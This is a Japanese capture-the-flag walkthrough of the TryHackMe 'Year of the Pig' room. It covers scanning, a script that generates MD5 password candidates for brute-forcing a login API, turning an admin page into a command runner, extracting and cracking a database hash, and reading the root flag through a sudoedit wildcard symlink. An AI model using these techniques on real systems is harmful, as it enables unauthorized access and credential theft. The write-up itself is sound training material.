# Year of the Pig CTF

https://tryhackme.com/room/yearofthepig

## Enumeration

```shell
TARGET=10.48.188.176
sudo bash -c "echo $TARGET   pig.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```sh
root@ip-10-48-71-16:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.188.176
+ Target Hostname:    pig.thm
+ Target Port:        80
+ Start Time:         2026-02-22 00:27:54 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x12c1 0x5ad6b295b4d49 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ /login.php: Admin login page/section found.
+ 1707 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2026-02-22 00:27:56 (GMT0) (2 seconds)
---------------------------------------------------------------------------
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.48.188.176/ ----
==> DIRECTORY: http://10.48.188.176/admin/                                                            
==> DIRECTORY: http://10.48.188.176/api/                                                              
==> DIRECTORY: http://10.48.188.176/assets/                                                           
==> DIRECTORY: http://10.48.188.176/css/                                                              
+ http://10.48.188.176/index.html (CODE:200|SIZE:4801)                                                
==> DIRECTORY: http://10.48.188.176/js/                                                               
+ http://10.48.188.176/server-status (CODE:403|SIZE:278)                                              
                                                                                                      
---- Entering directory: http://10.48.188.176/admin/ ----
+ http://10.48.188.176/admin/index.php (CODE:302|SIZE:3158)                                           
                                                                                                      
---- Entering directory: http://10.48.188.176/api/ ----
                                                                                                      
---- Entering directory: http://10.48.188.176/assets/ ----
==> DIRECTORY: http://10.48.188.176/assets/fonts/                                                     
==> DIRECTORY: http://10.48.188.176/assets/img/                                                       
                                                                                                      
---- Entering directory: http://10.48.188.176/css/ ----
                                                                                                      
---- Entering directory: http://10.48.188.176/js/ ----
                                                                                                      
---- Entering directory: http://10.48.188.176/assets/fonts/ ----
                                                                                                      
---- Entering directory: http://10.48.188.176/assets/img/ ----
+ http://10.48.188.176/assets/img/favicon.ico (CODE:200|SIZE:106905) 
```

```sh
dirsearch -u http://$TARGET -e php,txt

[00:31:46] 301 -  314B  - /admin  ->  http://10.48.188.176/admin/
[00:31:46] 302 -    3KB - /admin/  ->  /login.php
[00:31:47] 302 -    3KB - /admin/index.php  ->  /login.php
[00:31:51] 301 -  312B  - /api  ->  http://10.48.188.176/api/
[00:31:51] 200 -   68B  - /api/
...
[00:31:52] 301 -  315B  - /assets  ->  http://10.48.188.176/assets/
[00:31:52] 403 -  278B  - /assets/
[00:31:58] 301 -  312B  - /css  ->  http://10.48.188.176/css/
[00:32:08] 403 -  278B  - /js/
[00:32:08] 301 -  311B  - /js  ->  http://10.48.188.176/js/
[00:32:10] 200 -    1KB - /login.php
```

/api  /api/noexist でも同じ応答。

```
{"Response":"Error","Verbose":"This api only accepts post requests"}
```

POST ならファジングができそう。

```sh
$ curl http://pig.thm/api/ -X POST 
{"Response":"Error","Verbose":"Endpoint doesn't exist"}
```

## /login.php

passwordはMD5ハッシュが送信されている。

```http
POST /api/login HTTP/1.1
Host: pig.thm
Content-Length: 66
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: application/json
Content-Type: text/plain;charset=UTF-8
Origin: http://pig.thm
Referer: http://pig.thm/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

{"username":"admin","password":"5f4dcc3b5aa765d61d8327deb882cf99"}
```

HTTP応答

```json
{"Response":"Error","Verbose":"Incorrect Username or Password"}
```

sqlmap を実行すると、なんらかのWAFが検出された。

```sh
[09:39:58] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
```

エラーメッセージ。記憶可能な単語、2桁の数字、特殊文字の組み合わせというルール。

```
Remember that passwords should be a memorable word, followed by two numbers and a special character
```


数字と特殊文字を含まないワードリストを作る。

```sh
$ cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt | grep -i '^[a-zA-Z]*$' > ./common.txt

$ wc -l ./common.txt                                                                                       
3755 ./common.txt
```

```python
import hashlib

# 設定
input_file = "common.txt"
output_file = "md5_output.txt"
special_chars = ['#', '?', '!', '@', '$', '%', '+', '-']

with open(input_file, "r", encoding="utf-8") as infile, \
     open(output_file, "w", encoding="utf-8") as outfile:

    for line in infile:
        word = line.strip()
        if not word:
            continue

        for num in range(100):  # 00～99
            num_str = f"{num:02d}"

            for char in special_chars:
                candidate = f"{word}{num_str}{char}"
                md5_hash = hashlib.md5(candidate.encode("utf-8")).hexdigest()
                outfile.write(md5_hash + "\n")
```

300万件超

```sh
$ wc -l ./md5_output.txt 
3004000 ./md5_output.txt
```

実行したがヒットしなかった。

```sh
ffuf -u http://pig.thm/api/login -c -w ./md5_output.txt -X POST -d '{"username":"admin","password":"FUZZ"}' -fr 'Incorrect Username' -H 'Content-Type: application/json'
```

## api

apiのファジング。

```sh
oot@ip-10-48-71-16:~# ffuf -u http://pig.thm/api/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -X POST -fr 'Endpoint'

logout                  [Status: 200, Size: 0, Words: 1, Lines: 1]
login                   [Status: 200, Size: 64, Words: 5, Lines: 1]
adduser                 [Status: 200, Size: 77, Words: 6, Lines: 1]
resetpass               [Status: 200, Size: 83, Words: 6, Lines: 1]
deleteuser              [Status: 200, Size: 80, Words: 6, Lines: 1]
```

いずれも認証が必要。/login を先にしなければならない。

```sh
$ curl http://pig.thm/api/adduser -X POST
{"Response":"Error","Verbose":"Cannot add users without being authenticated"}

$ curl http://pig.thm/api/resetpass -X POST
{"Response":"Error","Verbose":"Cannot reset passwords without being authenticated"}

$ curl http://pig.thm/api/deleteuser -X POST
{"Response":"Error","Verbose":"Cannot delete users without being authenticated"}
```

## login 2

サイトの文字列から大文字と小文字の二種類を出力

```sh
$ cewl -w list_raw.txt -d 5 -m 5 http://pig.thm/ && \
(
    tr '[:lower:]' '[:upper:]' < list_raw.txt
    tr '[:upper:]' '[:lower:]' < list_raw.txt
) | sort -u > list.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

名前は adminではなく、marco で成功。

```sh
root@ip-10-48-71-16:~# ffuf -u http://pig.thm/api/login -c -w ./md5_output.txt -X POST -d '{"username":"marco","password":"FUZZ"}' -fr 'Incorrect Username' -H 'Content-Type: application/json'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://pig.thm/api/login
 :: Wordlist         : FUZZ: ./md5_output.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"username":"marco","password":"FUZZ"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Incorrect Username
________________________________________________

[REDACTED] [Status: 200, Size: 99, Words: 3, Lines: 1]
```

## admin

curtis ユーザーを発見。

id, whoami, echo, ifconfig コマンドしか反応しない。

```sh
eth0: flags=4163  mtu 9001
        inet 10.48.158.39  netmask 255.255.192.0  broadcast 10.48.191.255
        inet6 fe80::8d:50ff:fef6:c353  prefixlen 64  scopeid 0x20
        ether 02:8d:50:f6:c3:53  txqueuelen 1000  (Ethernet)
        RX packets 5334  bytes 1142812 (1.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4718  bytes 1827333 (1.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 1044  bytes 102150 (102.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1044  bytes 102150 (102.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Webと同じ認証情報でSSHに接続できた。

## 権限昇格１

```sh
marco@year-of-the-pig:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
marco@year-of-the-pig:~$ id curtis
uid=1001(curtis) gid=1001(curtis) groups=1001(curtis)
```

dbファイルはwww-data しか読めない。

```sh
arco@year-of-the-pig:~$ cat /var/www/html/api/dbconnect.php
<?php
    class webappdb extends SQLite3 {
        function __construct() {
            $this->open("/var/www/admin.db");
        }
    }
    $dbh= new webappdb or die("Couldn't open");
?>

marco@year-of-the-pig:~$ ls -la /var/www/admin.db
-rw------- 1 www-data www-data 24576 Feb 22 07:11 /var/www/admin.db
```

commands.php への書き込み権限がある。

```sh
marco@year-of-the-pig:/var/www/html/admin$ ls -al
total 56
drwxrwxr-x 2 www-data web-developers 4096 Aug 21  2020 .
drwxrwxr-x 7 www-data web-developers 4096 Aug 21  2020 ..
-rwxrwxr-x 1 www-data web-developers 1988 Aug 21  2020 adduser.php
-rwxrwxr-x 1 www-data web-developers 1718 Aug 21  2020 commands.php
-rwxrwxr-x 1 www-data web-developers 1766 Aug 21  2020 deleteuser.php
-rwxrwxr-x 1 root     root            338 Aug 21  2020 getCurrentUser.php
-rwxrwxr-x 1 www-data web-developers  270 Aug 21  2020 getUsers.php
-rwxrwxr-x 1 www-data web-developers  393 Aug 21  2020 includes.php
-rwxrwxr-x 1 www-data web-developers 3286 Aug 21  2020 index.php
-rwxrwxr-x 1 www-data web-developers  390 Aug 21  2020 landing.php
-rwxrwxr-x 1 root     root            143 Aug 21  2020 prepareAuth.php
-rwxrwxr-x 1 www-data web-developers 1803 Aug 21  2020 resetpassword.php
-rwxrwxr-x 1 root     root            268 Aug 21  2020 sessionCleanup.php
-rwxrwxr-x 1 www-data web-developers  782 Aug 21  2020 style.css
```

commands.php を `system($cmd)` が直接実行されるように書き換える。

`base64 /var/www/admin.db` を実行してdbファイルを入手。  
CrackStationでパスワードが判明したが、SSH接続失敗。

suはこのパスワードで可能だった。

## 権限昇格２

sudoedit で confing.php を編集できるがワイルドカードが使われている。

```sh
curtis@year-of-the-pig:~$ sudo -l
[sudo] password for curtis: 
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php
```

/var/www/html/a/b/config.php を rootフラグへのリンクとする。

```sh
marco@year-of-the-pig:/var/www/html$ ls
admin  api  assets  css  index.html  js  login.php
marco@year-of-the-pig:/var/www/html$ mkdir a
marco@year-of-the-pig:/var/www/html$ cd a
marco@year-of-the-pig:/var/www/html/a$ mkdir b
marco@year-of-the-pig:/var/www/html/a$ cd b
marco@year-of-the-pig:/var/www/html/a/b$ ln -s /root/root.txt config.php
marco@year-of-the-pig:/var/www/html/a/b$ ls -al
total 8
drwxr-xr-x 2 marco marco 4096 Feb 22 09:03 .
drwxr-xr-x 3 marco marco 4096 Feb 22 09:03 ..
lrwxrwxrwx 1 marco marco   14 Feb 22 09:03 config.php -> /root/root.txt
```

これでフラグを表示できた。

```sh
curtis@year-of-the-pig:/var/www/html/a/b$ sudoedit /var/www/html/a/b/config.php
```

## 振り返り

- パスワードを使えるのが一か所とは限らない。SSHでも使えないか確認すること。
- SSH接続で認証が失敗しても、同じパスワードでsuが成功することがあり得る。

## Tags

#tags:パスワード
